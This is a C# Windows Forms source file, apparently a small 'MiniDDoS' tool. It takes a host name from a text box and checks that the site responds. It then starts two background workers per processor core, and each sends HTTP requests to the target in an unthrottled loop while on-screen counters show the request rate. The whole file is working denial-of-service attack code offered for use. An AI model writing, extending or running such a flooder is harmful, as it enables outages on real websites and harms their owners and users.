using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Windows.Forms;

namespace MiniDDoS
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private long _tmp;
        private long _i1;
        private DateTime _time = DateTime.Now;
        private bool _isStopped = true;

        private void StartDDosAttack()
        {
            while (true)
            {
                if (_isStopped)
                {
                    break;
                }

                var r = (HttpWebRequest)WebRequest.Create("http://" + textBox1.Text);
                r.BeginGetResponse(res => { }, null);
                _tmp++;
                if (_tmp % 10000 == 0)
                    GC.Collect();
            }
            // ReSharper disable once FunctionNeverReturns
        }

        private static bool CheckUrl(string url)
        {
            var siteUri = new Uri(url);
            try
            {
                var myHttpWebRequest = (HttpWebRequest)WebRequest.Create(siteUri.GetLeftPart(UriPartial.Query));
                myHttpWebRequest.Timeout = 10000;
                var myHttpWebResponse = (HttpWebResponse)myHttpWebRequest.GetResponse();
                if (myHttpWebResponse.StatusCode == HttpStatusCode.OK)
                    return true;
                myHttpWebResponse.Close();
            }
            catch (Exception)
            {
                return false;
            }

            return false;
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            _isStopped = false;
            try
            {
                if (!CheckUrl("http://" + textBox1.Text))
                {
                    MessageBox.Show(@"Error!");
                    return;
                }
            }
            catch
            {
                MessageBox.Show(@"Error");
                return;
            }

            _time = DateTime.Now;
            for (var i = 0; i < Environment.ProcessorCount * 2; i++)
            {
                var bw = new BackgroundWorker();
                bw.DoWork += (s, a) => StartDDosAttack();
                bw.RunWorkerAsync();
            }

            var timer = new Timer { Interval = 25 };
            timer.Tick += (s, a) =>
                {
                    label2.Text = _tmp.ToString();
                };
            timer.Start();

            var timer2 = new Timer { Interval = 1000 };
            timer2.Tick += (s, a) =>
            {
                label6.Text = (_tmp - _i1).ToString();
                label8.Text = ((int)DateTime.Now.Subtract(_time).TotalSeconds).ToString();
                _i1 = _tmp;
            };
            timer2.Start();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            _isStopped = true;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }
    }
}